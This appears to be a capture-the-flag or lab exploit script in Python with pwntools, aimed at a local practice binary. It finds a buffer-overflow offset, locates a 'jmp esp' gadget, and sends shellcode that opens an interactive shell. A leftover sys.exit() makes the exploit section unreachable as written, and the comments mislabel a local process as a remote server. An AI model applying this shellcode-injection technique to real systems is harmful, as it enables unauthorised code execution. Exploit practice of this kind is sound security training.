#!/usr/bin/env python3
'''
Date : 1402/01/30
Author : AmirhosseinKhanshabani - @AmirZoyber
 
Buffer Overflow - Buffer Overflow

'''

from pwn import *
import sys

# context is used to set the architecture and the operating system of the remote server
context.update(arch='i386', os='linux')

# Define the io variable which is used to connect to the remote server
io = process("./BufferOverflow")

gdb.attach(io,'continue')  # Attach the gdb to the remote server and continue the execution of the remote server 
pattern = cyclic(512) # Generate the cyclic pattern with the length of 512
io.sendline(pattern) # Send the cyclic pattern to the remote server
pause() # Pause the execution of the remote server
sys.exit() # Exit the remote server

binary = ELF("./BufferOverflow") # Define the binary variable which is used to load the binary file of the remote server
jmp_esp = next(binary.search(asm("jmp esp"))) # Define the jmp_esp variable which is used to search for the jmp esp instruction in the binary file of the remote server

print(hex(jmp_esp)) # Print the jmp_esp variable
# output: 0x804a01b

exploit = flat([b"A"*140, pack(jmp_esp)], asm(shellcraft.sh())) # Define the exploit variable which is used to generate the exploit string

io.sendline(exploit) # Send the exploit string to the remote server
io.interactive() # Interact with the remote server
